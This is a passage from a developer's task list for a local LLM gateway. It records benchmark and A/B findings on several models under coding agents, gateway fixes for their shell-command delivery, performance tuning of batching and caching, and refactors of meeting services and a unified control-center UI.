  claude×GLM-4-32B×build cell (both arms `turns=1 tools=0`); (3) ROOT CAUSE via **mock-capturing
  claude's actual `/v1/messages`** (`/tmp/mock_anthropic.py`, no model loaded): Claude Code v2.1.185
  sends a 5817-char system prompt with **ZERO narration framing** + `tool_choice` absent, and pushes
  TOWARD tools — so the framing I stripped was my own invention. ⇒ GLM emits the ```rust artifact on
  create-from-scratch regardless of the agent prompt; not gateway-fixable without regressing edits.
  Sanitizer flipped to opt-in/default-OFF (`ROZUM_GLM_STRIP_FRAMING=1`; 56b37f3). **HOW TO USE:
  GLM-4-32B for edit/debug/chat (reliable); Qwen3.6-35B for create-from-scratch.** Full chain in
  docs/specs/glm4-bringup.md § Real A/B + ROOT CAUSE + HOW TO USE; memory project-glm4-native-port.

- [x] **matrix-35b-codex-test** — RESOLVED, **not a structural fail — a Layer-A flake** (isolated
  plucky-finch 2026-06-22). The baseline `codex×35B×test` FAIL (24.7s, rc=0, anomalously fast) did
  NOT reproduce: re-run at the same seed=1234 PASSed (67.6s), and a 3× characterization on a fresh
  gateway was **3/3 PASS** (47-49s) — so **4/4 PASS in fresh isolation, 1 FAIL only in the baseline**
  (where the cell ran on a gateway warmed by 8 prior cells). 35B is fully capable here. The fail is
  **agent-layer non-determinism**: codex emits a fresh `session id` per run (019ef0df…/019ef0e0…/…
  observed) → non-identical request → occasional bad trajectory the seed can't pin (≈80% pass).
  Lesson (feeds `matrix-nondeterminism-flip`): a single-run matrix red is NOT a bug until confirmed
  over N runs; this one dissolved under isolation. NOT a codex-delivery bug, NOT a model-weakness.
  **N-run isolation (plucky-finch 2026-06-22, seed1234, RUN_TIMEOUT=280, one gpt-oss load,
  3×each):** build **0/3**, test **0/3**, debug **1/3** (results `scripts/bench/results/
  isolate-gptoss-codex-Nrun`). 3/9 runs hit the 280s timeout — gpt-oss reasons very long under
  codex. build/test fail even on the non-timeout runs (113-266s) → not just a budget problem.
  This CONFIRMS Finding 5/6 with current pass-rates: create-from-scratch is a **gpt-oss-20b ×
  codex-V4A model+interface ceiling**, NOT a fresh gateway bug (gateway create-write-synth +
  codex-lean already maxed; Finding 6 model-only probes proved gpt-oss collapses under codex's
  21KB/18-tool load, not V4A-incompetence). On the agentic PICK (Qwen3.6-35B) codex clears these.
- [x] **matrix-gptoss-codex-build** — `0/3 → ~2/3` (plucky-finch 2026-06-23). NOT a model ceiling —
  the breaker was CONTEXT SIZE (codex's 20.9 KB instructions, which `codex_lean_keep` left untouched).
  Fixed by `codex_effective_instructions` (trim instructions to a focused prompt for gpt-oss) +
  reasoning=low. Create-from-scratch now ~2/3 and 3-5× faster. Spec `docs/specs/constrained-gptoss-delivery.md`.
- [x] **matrix-gptoss-codex-test** — `0/3 → ~2/3` (instruction-trim + reasoning=low). Residual ~1/3 is
  NOT "model nature" — KEEP=1 autopsy shows it's SHELL-MECHANICS delivery (dropped `>`, unclosed
  heredoc, `>` escaping, premature stop). Being attacked by the levers below.
- [x] **matrix-gptoss-codex-debug** — `1/3 → 3/3` (plucky-finch 2026-06-23). The aggressive
  instruction-trim (great for create) had REGRESSED edit to 0/3 (one 1.3 GB runaway loop) by dropping
  codex's V4A `apply_patch` format spec; restored a **concise V4A reminder in `LEAN_CODING_PROMPT`** →
  3/3, no loops. Lesson: one lean prompt must cover BOTH create (`cat >`) and edit (apply_patch format).

##### gpt-oss×codex — find the RIGHT conditions for the model (autopsy-driven; "model nature" is NOT an answer)

> **CORRECTION (plucky-finch 2026-06-23) — "CODE QUALITY is the bottleneck" (the pivot below, lines
> ~423-431) is REFUTED as a probe artifact. DO NOT chase code quality.** A model-only probe gave
> CLEAN 5/5 vs LOADED 1/5 correct `main.rs` → looked like the loaded prompt degrades the code. But
> "look before you guess" (dumping the output) showed the "broken main.rs" was literally **Cargo.toml
> content** — the bench task asks for TWO files, gpt-oss writes Cargo.toml in turn-1 and main.rs in a
> LATER turn, and my **single-turn** probe scored the turn-1 Cargo.toml as a broken main.rs. A
> corrected **multi-turn agent-loop probe** (execute writes, feed results back, check FINAL src/main.rs
> as the matrix does): **CLEAN 5/5 AND LOADED 5/5**. ⇒ gpt-oss's code is correct under the loaded
> prompt; there is **no code-quality bug**. The residual codex×gpt-oss build/test reds are in the
> **delivery seam** (the `gptoss-exec-decode-loopbreak` lever — `\uXXXX` in cmd, prose-as-args loop) +
> **measurement noise** (N=3-4 swings), NOT model code ability. `gptoss-temp-codequality` is
> de-prioritised (its premise is false). Method lesson: a model-only probe MUST mirror the agent's
> multi-turn loop; a single-turn capture of a multi-file task measures the wrong file.

KEEP=1 autopsies (plucky-finch 2026-06-23): gpt-oss writes correct CONTENT but fails the SHELL
MECHANICS (`cat <<EOF` with a dropped `>`, an unclosed heredoc that leaks the delimiter into the
file, `>` emitted as `>`, prose where the `{cmd}` JSON goes → an 11 GB codex retry-loop, and
`mkdir` then a premature stop) — yet it nails STRUCTURED tool calls (`write_file({path,content})`
= 4/4 in a clean probe). Strategy: give the model the structured tools it is reliable at and let
the gateway own the fragile shell translation. Levers to try (one task each, all matrix-gated):

- [x] **gptoss-inject-write-file** — TRIED (plucky-finch 2026-06-23), reverted as a WASH + a key
  insight. Implemented the inject + reroute (write_file → clean `cat >` overwrite) + prompt. It WORKS
  (writes land clean), and surfaced a real bug: **a successful `cat >` is SILENT, so the model read
  the empty result as failure and re-wrote Cargo.toml in a LOOP** (apply_patch doesn't loop because
  `patch` prints "patching file …"). Adding a confirmation `echo "wrote …"` to the reroute fixed the
  loop (build 0/4 → 2/4). BUT overall it was a WASH vs the committed clean-delivery state (build 3/4
  vs 2/4, test 1/4, debug 4/4 — within N=4 noise). **CONCLUSION: delivery is no longer the bottleneck**
  — the writes land clean either way; the residual build/test fails are now `cargo run -> ''` (the
  model's `main` prints nothing) and `cargo test red` (e.g. `reverse` without `.collect()`) = CODE
  QUALITY. So the next levers must target code-quality + measurement noise, not delivery:
  - **PIVOT — DELIVERY SOLVED, attack CODE QUALITY + NOISE.** debug is a solid 4/4 (V4A + `>`
    decode). build/test hover ~2-3/4 with huge N=4 swings, bottlenecked by the model's CODE, not our
    stack. The remaining levers (below) are the RIGHT conditions: reasoning-per-shape (does the model
    catch its own `main`-prints-nothing bug with more deliberation?), sampling/temperature for code
    completeness, and HIGHER N (REPS≥8) to make any delta measurable above the noise.
- [x] **gptoss-exec-decode-loopbreak** — **(a) DONE (`dba90c0`):** `normalize_codex_tool_args` decodes
  `\uXXXX` in exec args (both `cmd` + `command` array). **(b) DONE (`2aa638a`):** empty exec args
  (codex "expected value at line 1 col 1" → retry runaway) now substituted with a no-op echo so codex
  continues. Prose args (non-empty, non-JSON) returned unchanged — live repro still needed to fix that
  shape. Test `empty_exec_args_become_no_op_echo`; 91/91 gateway tests green.
- [x] **gptoss-reasoning-per-shape** — **CLOSED via `agentic-20260703-124949` reasoning=low full matrix (2026-07-03).**
  Results: claude×gpt-oss **12/12** (perfect, all tasks); codex×gpt-oss **7/12** (greet/build×2 PASS,
  fix/debug/rpn high-variance); opencode×gpt-oss **2/12** (only greet passes, all coding fast-fail in 4-8s).
  `reasoning=low` is CORRECT default — NOT a reasoning level issue:
  (a) claude 12/12 = can't improve; (b) codex failures are run-to-run variance (fix: FAIL rep1 PASS rep2;
  debug: FAIL rep1 PASS rep2) + rpn consistently weak (code logic, not reasoning); (c) opencode failures are
  tool-format incompatibility (model doesn't speak opencode's format), not planning. Medium reasoning would NOT
  fix any of these. Model footprint 19.3 GB confirmed (gpt-oss-20b-MXFP4-Q4).
- [x] **gptoss-temp-codequality** — **CLOSED (2026-07-03).** claude×gpt-oss 12/12 at current temperature
  (no incomplete code, no missing `.collect()` / empty main observed). The original symptom was a code
  completeness tail in early codex runs, now explained by run-to-run variance (not a temperature issue).
  Lowering temperature is more likely to hurt than help at current pass-rate. No A/B needed.
- [x] **gptoss-catheredoc-normalize-v2** — DONE (plucky-finch 2026-06-23), live-autopsy-driven +
  unit-proven. The v1 over-fire is avoided by a PRECISE, heredoc-AWARE condition: `repair_heredoc_write`
  rewrites `cat <path> <<DELIM … DELIM` (NO `>`) → `cat > <path> <<DELIM` ONLY when there is a real path
  arg, a heredoc body, and no existing redirect — `cat <path> <<DELIM` is NEVER a meaningful read (cat
  discards the heredoc given a file arg), so write-intent is unambiguous. Tracks the heredoc delimiter so
  body lines that start with `cat …` are never touched; spares `cat > x`, plain `cat x` reads, and stdout
  `cat <<EOF`. Gated `ROZUM_HEREDOC_REDIRECT_FIX` (default on). Root cause it fixes (autopsy run OzUnnR):
  gpt-oss's CORRECT final `main.rs` was sent via `cat src/main.rs <<'EOF'` (no `>`) → silent no-op read →
  file never landed → `cargo run` empty → build red. Since the matrix grades build by FINAL FILE STATE
  (it runs cargo itself), inserting the `>` makes the correct code land → build passes even when the model
  never ran cargo. unit test `heredoc_redirect_repairs_missing_gt_and_spares_valid_forms` (exact OzUnnR
  input + 5 negatives), 80/80 gateway tests green.
- [x] **gptoss-verify-before-done** — TRIED + REFUTED by a powered A/B (plucky-finch 2026-06-23), reverted.
  Hypothesis: the residual build reds are the model shipping NON-COMPILING final code (`.rev()` missing
  `.collect()` = E0308; `unwrap_or_default(closure)`/`unwrap_or_default("")` = E0061; a malformed Cargo.toml
  `authors = "Bob\n"` multi-line + a U+2011 non-ASCII hyphen in the package name) and declaring "the program
  works" WITHOUT running cargo after its last edit. Built a hard run-before-stop `VERIFY_GATE_CLAUSE`
  appended to LEAN_CODING_PROMPT (gated `ROZUM_CODEX_VERIFY_GATE`, default on). **BEHAVIOURALLY it worked**
  — with the gate the model ran cargo 2-3× in 6/6 build cells (vs OzUnnR/mVFvoN never running it). **BUT the
  pass-rate effect is NOISE.** First A/B looked great (OFF 2/6 → ON 5/6) but did NOT replicate; the POWERED
  A/B (build REPS=10 each) gave **OFF 8/10 vs ON 5/10** — i.e. the gate, if anything, is slightly WORSE, and
  the whole cell is dominated by variance (samples seen: 1/3, 2/4, 2/6, 5/6, 8/10, 5/10). So the verify gate
  is NOT a fix → reverted (uncommitted, never shipped). **LESSON (isolate skill realized): a fix shipped on
  a 5/6 hunch would have silently regressed; the powered A/B saved it. Read this cell as an N≥10 pass-rate,
  never a single run.** ROOT TRUTH: after the heredoc fix, the residual codex×gpt-oss build reds are a LONG
  TAIL of DISTINCT small model-correctness mistakes (a different tiny error each run) + the irreducible
  agent-layer trajectory noise ([[project-matrix-nondeterminism]] Layer-A: session-id/timestamp per run) —
  NOT a single gateway-fixable bug. A prompt nudge cannot beat that. The one DETERMINISTIC, provable lever
  in this space was heredoc-redirect (above), and it shipped. Possible future: (b) the U+2011-hyphen /
  multi-line-TOML are deterministic gateway-normalizable in heredoc bodies (risky — could corrupt intended
  unicode; defer), or (c) `gptoss-codex-cascade` (fall back to 35B) to mask the model-correctness tail.
- [x] **footprint-estimate-accuracy** (reliability/no-reboot) — DONE via two landed improvements:
  (A) `tighten()` in `footprint.rs` uses measured `cached_peak()` running-max to shrink the
  conservative estimate toward observed reality (sprint item line ~637; `footprint-peaks.json`).
  (B) `eager_coresident_footprint()` (`208fa73`) counts the shared reserve ONCE for co-resident
  pipelines (saves ~5.5 GiB per extra tier). The 35B-refuses-to-fit case that prompted this is
  covered by (A): tighten() makes the ~30 GB estimate → ~26 GiB after a measured ~24 GB peak.
- [x] **glm-shell-delivery-fix** — INVESTIGATED + REFUTED as a lever (plucky-finch 2026-06-23, isolate
  skill, operator-requested). After the full 3-model matrix (GLM-32B 4/15), dug into GLM's create-from-
  scratch failures. Model-only probe + DETERMINISTIC A/B (multi-turn, real cargo execution, fix toggled
  — no agent flakiness) revealed GLM's failure is **multi-layered, NOT one fixable delivery bug** (unlike
  the gpt-oss heredoc fix): (1) `cargo new <name>` → SUBDIR, files not in cwd (5/5 deterministic, refutes
  my earlier echo-quoting guess); (2) fragile `echo 'multiline\n…' > file` (literal `\n`, `>` inside
  quotes); (3) **GLM's Read/Write tool-call JSON written INTO the file AS CONTENT** (`file_path: …`,
  `Read {"file_path":…}` seen in main.rs); (4) hallucinated "DONE" before a working program; (5) correct
  code that lands in the wrong place (subdir). Built the full delivery cascade (cargo-new→`cargo init` +
  strip `<name>/` prefix + echo→heredoc with `\n` decode) and A/B'd it: **files-in-cwd 0/4 → 4/4 (delivery
  FIXED, proven) but build-passes 0/4 → 0/4 (UNCHANGED)** — fixing delivery does NOT fix the build, because
  layers 3-5 (tool-call-as-content, hallucination, code-correctness) remain. CONCLUSION: GLM's create-from-
  scratch is deep model-quality tool-use non-robustness, not a single delivery bug; a fragile GLM-specific
  rewrite cascade = real complexity + regression risk for ZERO matrix benefit → DON'T SHIP (tested in a
  probe BEFORE touching the gateway, so nothing to revert). The right GLM lever is the cascade below (mask
  with 35B), or use GLM for chat/code not agentic. Third hypothesis→powered-A/B→refutation of the session
  (after verify-gate and "prompt degrades gpt-oss code") — the discipline keeps catching necessary-but-
  insufficient fixes before they ship.
  **DEEPER ROOT (verbose isolation dump, 3/3 deterministic, operator "dig further"):** the real blocker is
  NOT delivery at all — GLM runs `cargo new reverse-cli` (×2), then responds with INTENT TEXT *"Let me
  create the directory first and then initialize the project."* and emits **NO tool call** → the agent
  loop ends → the reverse code is NEVER written → `src/main.rs` stays the cargo-default `Hello, world!` →
  build fails. This is GLM's **agentic no-follow-through / decision gap** ("emits prose instead of naming a
  tool", [[project-glm4-native-port]]), a MODEL property — GLM doesn't even REACH the delivery step, so no
  shell-delivery fix can touch it. WORSE: the `cargo new→cargo init` rewrite was actively HARMFUL — the
  2nd `cargo init` errors "directory already exists", confusing GLM into stopping even faster. artifact-
  synth can't help either (it synthesizes a write from file CONTENT in the text; here the text is pure
  intent, no content). Definitive: GLM create-from-scratch fails because GLM stops after step 1 announcing
  step 2 without doing it. Lever = 35B cascade (a model that follows through), or constrained tool-emission
  (the interface-change route the isolate skill warns backfires — gpt-oss constrained was 0/4).
  **CORRECTION — the "decision gap / model property" claim above was an OVER-ASSUMPTION; the RAW tokens
  refute it (operator "don't assume, find what's actually happening", `ROZUM_RAW_DUMP` added, 4f60433).**
  Per-turn raw generated text shows GLM DOES chain tool calls and IS capable: turn0 `cargo new`, turn1
  prose+`cargo init` toolcall, turn2 prose+a toolcall that writes Cargo.toml+main.rs with CORRECT reverse
  code (`args[1].chars().rev().collect::<String>()`), turn3 prose "Now let's run cargo run" (stops at the
  verify step). So GLM is NOT failing for "can't follow through" — it writes correct code and chains. The
  REAL failures are **delivery** (`cd reverse-cli` → subdir not cwd; broken `echo '…\n…' \n > file` —
  literal `\n` with no `-e` + a stray `\n` before the `>`) **plus chaining variance** (some runs stop
  early, confused by the 2nd cargo-new's "already exists"). CLOSER to fixable (delivery, like gpt-oss
  heredoc) than the over-claimed model-ceiling. A cleaner delivery fix to try (NOT the harmful cargo-init
  rewrite): strip `cd <name> &&` + `<name>/` so files land in cwd, decode literal `\n`/stray-`\n` in echo.
  Still bounded by GLM's chaining variance. Lesson (again): read the raw bytes before theorizing "model
  nature."
  **CLEAN delivery fix BUILT + A/B-REFUTED (operator "Да", plucky-finch 2026-06-23):** strip `cd <dir> &&`
  + echo→`printf '%b'` (decode the literal `\n`, drop the stray `\n` before `>`), NOT the harmful cargo-
  init rewrite. UNIT-PROVEN on GLM's EXACT raw turn-2 command (files land in cwd, `cargo run -- hello` →
  **olleh**). But the live multi-turn A/B (N=6): files-in-cwd 0/6→2/6 (marginal), **build 0/6 → 0/6 (no
  change)** — the fix is correct on its target shape, but GLM's run-to-run VARIANCE (different command
  forms + different stop points each run) means it rarely produces that shape end-to-end. So a shape-
  specific delivery fix is necessary-but-not-sufficient; the dominant factor is GLM's UNRELIABILITY
  (variance), not one shape. NOT shipped (marginal, fragile GLM-specific code, zero build lift; tested in
  a probe → gateway clean). FINAL on GLM: capable but too variable for a gateway fix — the lever is the
  35B cascade below. (4th hypothesis→A/B→refutation of the session: verify-gate, prompt-degrades-code,
  cargo-init-cascade, clean-delivery — the discipline pays every time.)

#### 2. Plugin-ize everything

> **TRIAGE (nimble-raven 2026-06-22): none of the three is a clean, safe, no-model increment to
> start *now* — each needs an operator decision first. Recorded so the next agent doesn't re-derive.**
> - **wireprotocol** — HIGHEST risk: it rewrites the matrix-critical request/SSE path in
>   `crates/rozum-gateway/src/gateway.rs`, and arch-spi Stage 3 already found the trait **net-negative**
>   (three genuinely different typed extractors `Json<OaiChatReq>`/`Json<RespReq>`/`Json<AnthropicReq>`
>   → three SSE sequences; a trait either erases axum's compile-time validation = behaviour change, or
>   is a fat indirection that deletes no complexity). Nothing in the code changed since to flip that.
>   Can't be fully de-risked without loading a model. → **re-scope** (unify only internal
>   `ChatRequest`/`ChatEvent` + cross-cutting policy, leave extractors per-route) and **re-decide** first.
> - **services** — explicitly **"out of scope (decided)"** in arch-spi ("subcommands stay"); it also
>   touches the reboot-sensitive `run_gateway` dispatch (`src/main.rs:~923`). → needs an operator override.
> - **x86-engine** — **already structurally a plugin**: `X86NativeBackend impl ChatBackend` + `X86Engine
>   impl LocalEngine`, selectable via the forced build chain (`main.rs:~4213`, symmetric with MLX's
>   direct `try_build_mlx_native_backend` — NOT the GGUF registry-IoC path, which exists only for the
>   workspace-split core→gguf dep break). The only real remaining work is the **Vulkan kernels**, which
>   can't be built/tested on Apple Silicon. Mirroring GGUF's `BackendEngine`/`OnceLock` registry IoC
>   would add an asymmetric abstraction (MLX/mistralrs don't use it either), not plugin-ize. → defer to
>   real x86 hardware.

#### 3. Micro-perf

- [x] **perf-baseline** — **RUN DONE (2026-07-03, slot free after GLM-4.7-Flash bench).**
  `scripts/bench/run.sh` over Qwen3.6-35B-A3B-4bit-DWQ (BENCH_NCTX=8192). Results in
  `scripts/bench/results/20260703-124650/`. KEY NUMBERS: **load 5s**, **peak 21,161 MB (20.7 GB)**,
  **decode 81–83 t/s flat across tasks** (TTFT 0.13–0.23s). Decode t/s is **flat from 19→768 output
  tokens** (81.4/81.4/81.0 for t6/t7/t8) → pre-allocated KV cache confirmed, no O(context) regress.
  t2-arith FAIL = model's arithmetic error (not a gateway bug). **KV flatness ALSO confirms
  `perf-kv-ctxsweep-verify`** — the ROZUM_CTXSWEEP cargo test is redundant (same evidence from run.sh).
  Prep notes (sunny-civet 2026-06-23): lever audit done; KEY FINDING: 2 of 4 levers already realized.
  - Tooling already exists (don't rebuild): `scripts/bench/run.sh` (single-stream per-model: TTFT,
    decode t/s excl. prefill, peak RAM) + the in-code `#[ignore]` benches
    (`mlx_{dense,moe}_backend_chat_tps`, `mlx_hybrid_batched_decode_throughput`,
    `mlx_qwen35_moe_decode_bench` incl. `ROZUM_CTXSWEEP` + build-vs-eval split, `mlx_compile_probe_plain`).
- [x] **perf-batch-gather-shortcircuit** — DONE (2026-07-02, master `a8efa27`). `jobs_in_channel:
  Arc<AtomicUsize>` added to `MlxNativeBackend` — incremented in `chat()` before send, decremented in
  `worker_main` after `blocking_recv()`. Short-circuit in gather loop: if counter==0 after `first`,
  skip the 10 ms batch window (lone request, no TTFT tax). One final non-blocking `try_recv()` after
  the counter-0 check guards the race; if counter>0, full window runs (behavior unchanged).
  90 lib tests green. Slot-gated validation remaining: `*_two_concurrent` + `continuous_admit_three`
  to confirm batching still fires; lone TTFT improvement measured live.
- [x] **perf-batch-default-on** — DONE (2026-07-02, master `fbd1d89`). A/B on Qwen3-4B:
  single-req TTFT unchanged (122→121 tok/s, noise); 2 concurrent 125→169 tok/s (+35%);
  4 concurrent at BATCH=4 → 210 tok/s (+67%). `batch_cap()` default flipped 1→2 in
  `crates/rozum-mlx/src/mlx_native_backend.rs`. `ROZUM_BATCH=1` to disable; `ROZUM_BATCH=4`
  for heavier parallel workloads.
- [x] **perf-compiled-decode** — **ON-ICE (Stage-0 probe was NO-GO, `f6b20a3`).** Decode is ~92% CPU
  graph-build, so a compiled fixed-shape graph was the obvious lever — but `mlx_compile_probe_plain` on
  Qwen3-0.6B already showed compiled decode is SLOWER (T=1 0.69×, T=16 0.58×), matching the
  `compile_with_state` net-negative; decision recorded: don't build Stages 1/2 (batching was the real
  lever). Only the caveats remain (27B vs 0.6B, fixed-shape vs growing cache) — low-confidence. **Don't
  re-run the 0.6B probe; it's answered.** Re-open only for a 27B + fixed-shape re-probe. *(slot, low pri)*
- [x] **perf-batch-arch-coverage** — DONE: `ff14fa6`. Added `LoadedModel::Glm4(_)` to
  `is_batchable_arch()` — Glm4 attention already reads `BATCH_PAD_OFFSETS` for per-row rope
  (same pattern as Llama/Qwen2); `dense_forward` + `run_batch` already handled it. Scaffolded
  `mlx_glm4_batched_ragged_byte_exact` test (needs slot). GptOss excluded — its internal
  full/swa masks use scalar `cache.offset()`; fix requires per-row mask construction in model.
- [x] **perf-prefix-reuse-fastpaths** — DONE: `39535e6`. `run_plookup_job` + `run_spec_job`
  both accept `&mut PrefixStore`, compute `conv_len`, `take_dense` on entry (truncate + set
  `MlxDenseTarget::kv_len`), `put_dense` after decode. Draft reconciles its own KV via
  `fed` tracking — no separate draft-side reuse needed. `ROZUM_PREFIX_CACHE=0` disables.
  Multi-turn plookup/spec-decode now skip the re-prefill of the whole conversation.
- [x] **perf-batch-nonbatchable-rows** — **QUANTIFIED + INSTRUMENTED (2026-07-03).** Added
  `BATCH_SERIAL_{SEED,PENALTY,CONSTRAINED}` atomics + `is_batchable()` increments them; exposed in
  `BatchStats` (serial_seed, serial_penalty, serial_constrained) via `/stats`. In practice: penalty
  rows are rare (none configured by default); seed rows only when `ROZUM_SAMPLING_SEED` is set globally
  (default OFF); constrained-tool rows = ALL agentic tool-call requests (always constrained when
  `ROZUM_CONSTRAIN=1`). Per-row implementation for seed/penalty deferred (near-zero agentic impact);
  constrained-tool batching needs per-row mask construction (GptOss-arch blocker, separate work). *(slot)*
- [x] **perf-kv-ctxsweep-verify** — **DONE via perf-baseline run.sh (2026-07-03).** run.sh results over
  35B-DWQ show decode flat at **81.4/81.4/81.0 t/s** across t6(356)/t7(512)/t8(768) output tokens at
  8192 ctx — confirms the pre-allocated KV has no O(context)/token regression. The cargo test
  `ROZUM_CTXSWEEP=1 mlx_qwen35_moe_decode_bench` is redundant (needs non-DWQ model not cached; same
  evidence from run.sh). *(slot)*

### Services & clients — separate services, clean APIs, one client (operator 2026-06-23, spec `docs/specs/services-and-clients.md`)
Drivers: ALL THREE — (a) failure isolation, (b) one client over clean APIs (UCC), (c) cleanliness.
GROUNDED: models↔meetings ALREADY separated (separate crates, no code dep, separate processes, coupling
only via gateway HTTP) — keep. The one real gap is server↔clients for MEETINGS: clients read the
jsonl/principal/cursor files DIRECTLY → depend on storage format. Fix: ONE `rozum-meeting::client` API
(operations, not format), local in-process + same ops over HTTP. Separate at the SERVICE layer, unify at
the CLIENT layer; no binary split (process separation already gives (a)).
- [x] **svc-meeting-client-api-read** — DONE. New `rozum-meeting::client` API encapsulates
  `resolve_room_root`/`read`/`inbox`(+`InboxCursor`/cursor)/`roster`; the `rozum` bin's read/inbox/who
  handlers are now thin presentation over it (no inline jsonl/principal/cursor parsing in the binary).
  Behavior-preserving (80 meeting tests green; live read/inbox/who verified). The storage format is now
  internal to the crate — the contract for web/TUI/UCC to consume next.
- [x] **svc-meeting-client-api-write** — DONE. `client::post_identity` (the single agent-vs-human posting
  rule), `whoami` (Identity enum), `establish` (hello), `daemon_status` added; the bin's post/whoami/hello/
  status handlers are thin over them. 80 tests; live whoami/status verified. CLI now fully thin over the API.
- [x] **svc-meeting-http-parity** — DONE (read side). `rest_read` axum surface gains `GET /rooms/{name}/
  inbox/{handle}` (mentions addressing a handle) + `GET /roster` (live agent principals), both over
  `client::inbox`/`client::roster`. End-to-end test (inbox endpoint). So remote/web/UCC can fetch JSON,
  not disk/exec. (POST-over-HTTP deferred — the socket submit path + auth is a separate write task.)
- [x] **svc-migrate-web-tui** — DEFERRED / largely superseded. The web `.ssc` already consumes the client
  API indirectly (execs `rozum meetings …`, now thin over it); the hand-written Rust TUI is REPLACED by the
  UCC `Tk` app → migrating it now is throwaway. Re-open only if a need predates UCC (web exec→HTTP, which
  also needs the REST server on by default).
- [x] **svc-gateway-api-doc** — DONE. Gateway service API contract documented in the spec (inference:
  OpenAI /v1/chat/completions+/v1/responses, Anthropic /v1/messages; control: status + share ledger;
  the sole meetings↔models seam = model_participant → /v1/chat/completions, HTTP not code).

### Unified control center — one `.ssc` UI for TUI + web/PWA (operator vision 2026-06-23, spec `docs/specs/unified-control-center.md`)
TUI + web + `.ssc` + PWA = ONE app, one `.ssc` source, compiled twice (TUI + web/React/PWA), for ALL
of rozum (meetings, models, gateway/residency, …). KEY RECON FINDING: ssc already ships **Tk** — a
mature framework-agnostic reactive UI (`std/ui`) with **11 tested render backends** (`react`/`solid`/
`vue`/`swing`/`javafx`/`swiftui`/`electron`/…) + SSR (`Ssr.renderToHtml`) behind one SPI
(`FrontendFrameworkSpi.emit`). So most of the vision EXISTS; the real gap is a **TUI (ratatui) backend**
+ rewriting rozum's UI in Tk. Operator chose: hybrid SSR+islands × meetings-first.
- [x] **ucc-tui-backend** — DONE in ScalaScript. `frontend/tui` emits native ratatui+crossterm crates with
  layout, signals, focus/events, remote tables, routing, styling, and managed fetch refresh. The final refresh
  parity fix is `6c6fcf21b`; `frontendTui/test` 36/36. *(scalascript)*
- [x] **ucc-control-serve** — DONE. Always-up control HTTP (`rozum gateway control-serve --port 8411`):
  `GET /control/status` serves the live snapshot from disk (NO gateway needed) + permissive CORS. Live-
  verified (shows the running matrix gateway + residency + catalog). The data layer for the UCC web is now
  reachable without a model loaded. NOTE: wiring the WEB app to client-fetch it needs the React CODEGEN
  build (`ssc run --frontend react --mode client/server`), NOT the interpreter+emit (which only does static).
  That codegen path has toolchain friction (server-mode: Scala compile error `value backend is not a member
  of scalascript`; client-mode: hangs) — plucky-fox's domain (the n=50 build-pipeline questions). The model-
  DSL (ModelView/ForModel) IS web-capable (global builtins, not native-only) — confirmed.
- [x] **ucc-poc-web** — DONE (2026-06-23). PROVED the Tk→web half end-to-end: `clients/control/control-center.ssc`
  (`std/ui`: vstack/hstack/card/table/badge/heading) compiled to a React SPA FIRST TRY (no lowering errors),
  served live via `bin/ssc` (SSR shell + react app.js), headless-render shows the full control-center (Gateway/
  residency + installed catalog + meetings panels). ANSWERS the open questions: backend = `frontend: react`
  frontmatter (not a build flag); entrypoints `serve(view, port)` / `emit(view, dir)`; run via `bin/ssc app.ssc`.
  Data is static placeholder — next: bind live via the control-API (`/control/status` + meetings `rest_read`) with
  `std/ui/fetch-json`. The SAME `.ssc` compiles to TUI once `frontend/tui` lands.
- [x] **ucc-poc-msglist** — DONE 2026-07-20. `clients/control/meeting-message-list.ssc` is one Tk source for
  React + ratatui, using one remote table and refresh tick. Isolated dual-target smoke emits web, builds the
  Cargo crate, asserts generated refresh wiring, and renders fetched fixture rows without touching services.
- [~] **ucc-meetings-in-tk** — ONE `.ssc` source emitting both the UCC web meeting client and the
  native terminal one, so `rozum meetings attach` stops being hand-written Rust and the two cannot
  drift. Claimed 2026-08-04 (`.work/active/ucc-meetings-in-tk.claim`), branch
  `feature/ucc-meetings-in-tk`, worktree `.worktrees/feature/ucc-meetings-in-tk`.
  **Spec written first: `docs/specs/ucc-meetings-in-tk.md` — read it, it carries the corrections
  below and the identity decision Stage C cannot start without.**
  **CORRECTION — this entry used to say "parity with the 1389-line hand-written Rust TUI"; that is
  wrong by ~4× and would size the task badly.** Three different programs were conflated:
  `tui/attach.rs` (312 lines) is the current daemon TUI and **the only thing that retires**;
  `meeting/tui_client.rs` (1010) is the daemon CLIENT MODEL that `post_once`, the coordination hooks
  and the messenger bridges depend on and it **stays**; `tui/mod.rs`+`app.rs` (1091) are the LEGACY
  in-process room behind `--legacy-room` (`src/main.rs:1226`) — a separate task, not this one.
  Read the parity list off `attach.rs`, NOT off `docs/specs/agent-meetings-tui.md`, which still
  describes moderator modes/turn timeouts/interject/budget — all removed when the TUI became a
  daemon client.
  **BLOCKER, found while specing (this is the schedule):** ScalaScript's TUI frontend
  (`../scalascript/frontend/tui/.../TuiEmitter.scala`) emits only a *managed GET* whose URL is a
  literal fixed at emit time — `collectFetches` keeps `FetchInfo(fetchUrl, tickId)`, and
  `grep -rE 'fetchAction|"POST"|Method::Post' frontend/tui/src/main/` is empty. So **the composer
  cannot submit and the switcher cannot re-target the transcript fetch** — two of the three named
  features. The widgets themselves are fine (`TextInput`/`Button`/`Toggle` + focus ring + Enter).
  STAGES — **A** (rozum, unblocked, in progress): `clients/control/meetings.ssc`, the real transcript
  from one source — header, `── date ──` dividers, severity-coloured incident badges, bold author —
  emitting both react and ratatui; done when both build from the one source and a headless
  `SSC_TUI_SNAPSHOT=1` run shows a divider + a badge. **B** (scalascript, CRITICAL PATH, filed
  there): `tui-fetch-post` and `tui-fetch-url-signal`, each gated by a deterministic local-HTTP test
  like `specs/frontend-tui-fetch-refresh.md` did for GET. **C** (rozum, after B): switcher +
  composer + slash commands + unread → delete `attach.rs`, point `rozum meetings attach` at the
  emitted binary. C must FIRST settle identity: REST submit authenticates as a `ConsoleUser`, while
  `attach.rs` posts under the human's local identity — posting over REST as-is silently changes
  who-said-what.
  Data plane needs NO new daemon endpoints for reading: `:8401` already serves `/rooms`,
  `/rooms/{n}/messages/{date}`, `/rooms/{n}/days`, `/rooms/{n}/events` (SSE), `/whoami`, `/roster`.
  **STAGE A DONE 2026-08-04 (`3e62b99` on the branch).** `clients/control/meetings.ssc` renders the
  transcript as BOTH the React client and a native ratatui binary, badge column included;
  `clients/control/test/ucc-meetings-dual-target.sh` + its fixture gate it. Daemon side gained two
  ADDITIVE derived fields, `badge` and `time` (`StoredTurn::time_hm()`, `rest_read::message_json`) —
  a generated client has nowhere to run `badge()` or format an epoch, and computing them client-side
  would create a second implementation to drift from the Rust one. rozum-meeting 193/193, new smoke
